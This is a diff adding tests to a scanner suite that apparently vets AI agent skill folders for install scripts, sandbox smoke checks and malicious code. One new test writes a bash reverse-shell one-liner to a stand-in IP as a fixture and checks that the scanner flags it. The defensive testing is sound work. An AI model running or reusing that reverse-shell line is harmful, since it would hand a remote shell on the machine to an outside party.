@@ -1179,6 +1179,50 @@ describe("scanTrustTree", () => {
     expect(seenSmoke[0]?.join("\n")).toContain("test -r '/scan/install'");
   });
 
+  it("runs sandbox smoke for symlinked installer scripts", async () => {
+    skill("skills/clean", "# Clean\n");
+    write("REAL", "echo install\n");
+    try {
+      symlinkSync("REAL", join(dir, "install.sh"));
+    } catch (err) {
+      if ((err as NodeJS.ErrnoException).code === "EPERM") return;
+      throw err;
+    }
+    const seenSmoke: string[][] = [];
+    const run = fakeRunner((argv) => {
+      const skillspector = successfulSkillspector(argv);
+      if (
+        argv[0] === "docker" &&
+        argv[1] === "run" &&
+        argv.some((arg) => arg.includes("aih sandbox smoke ok"))
+      ) {
+        seenSmoke.push(argv);
+        return { code: 0, stdout: "aih sandbox smoke ok\n" };
+      }
+      if (skillspector !== undefined) return skillspector;
+      return undefined;
+    });
+
+    const result = await scanTrustTreeWithAnalyzers(dir, {
+      env: {},
+      platform: "linux",
+      posture: "vibe",
+      run,
+    });
+
+    expect(result.checks).toEqual(
+      expect.arrayContaining([
+        expect.objectContaining({
+          name: "skill sandbox smoke test",
+          verdict: "pass",
+          detail: expect.stringContaining("install scripts"),
+        }),
+      ]),
+    );
+    expect(seenSmoke).toHaveLength(1);
+    expect(seenSmoke[0]?.join("\n")).toContain("test -r '/scan/install.sh'");
+  });
+
   it("fails applicable sandbox smoke when detector runtime is missing", async () => {
     skill("skills/clean", "# Clean\n");
     write("skills/clean/package.json", JSON.stringify({ name: "clean-skill" }));
@@ -1196,6 +1240,30 @@ describe("scanTrustTree", () => {
           detail: expect.stringContaining("detector runtime is missing"),
         }),
       ]),
+    );
+  });
+
+  it("records an explicit sandbox smoke skip for non-runtime script-like notes", async () => {
+    skill("skills/clean", "# Clean\n");
+    write("build-notes.md", "notes only\n");
+
+    const result = await scanTrustTreeWithAnalyzers(dir, {
+      posture: "vibe",
+    });
+
+    expect(result.checks).toEqual(
+      expect.arrayContaining([
+        expect.objectContaining({
+          name: "skill sandbox smoke test",
+          verdict: "skip",
+          detail: expect.stringContaining(
+            "skill shape has no install scripts, package manifests, or incoming MCP config",
+          ),
+        }),
+      ]),
+    );
+    expect(result.checks.some((check) => check.code === "trust.sandbox-smoke-unavailable")).toBe(
+      false,
     );
   });
 
@@ -2586,6 +2654,22 @@ describe("scanTrustTree", () => {
     );
   });
 
+  it("scans arbitrary extensionless files for malicious shapes", async () => {
+    skill("skills/clean", "# Clean\n");
+    write("payload", "bash -i >& /dev/tcp/203.0.113.10/4444 0>&1\n");
+
+    const checks = await scanTrustTree(dir);
+
+    expect(checks).toEqual(
+      expect.arrayContaining([
+        expect.objectContaining({
+          code: "trust.malicious-code",
+          location: expect.objectContaining({ uri: "payload", startLine: 1 }),
+        }),
+      ]),
+    );
+  });
+
   it("skips oversized script files before reading them as UTF-8", async () => {
     skill("skills/clean", "# Clean\n");
     write(
@@ -2638,6 +2722,26 @@ describe("scanTrustTree", () => {
         SKILLSPECTOR_IMAGE_DIGEST,
       ),
     ).toThrow(/unsupported.*bind mount source/i);
+  });
+
+  it("requires install script smoke evidence separately from package manifests", () => {
+    const argv = sandboxSmokeDockerRunArgv(
+      "linux",
+      "/scan-root",
+      {
+        skillDirs: ["clean"],
+        installScripts: true,
+        installScriptFiles: ["install.sh"],
+        mcpConfig: false,
+        packageManifests: ["package.json"],
+      },
+      SKILLSPECTOR_IMAGE_DIGEST,
+    );
+    const script = argv.at(-1);
+
+    expect(script).toContain("test -r '/scan/package.json'");
+    expect(script).toContain("test -r '/scan/install.sh'");
+    expect(script).not.toContain("test -r '/scan/install.sh' || test -r '/scan/package.json'");
   });
 
   it("invokes Cisco skill-scanner through offline uvx without network-enabling options", () => {
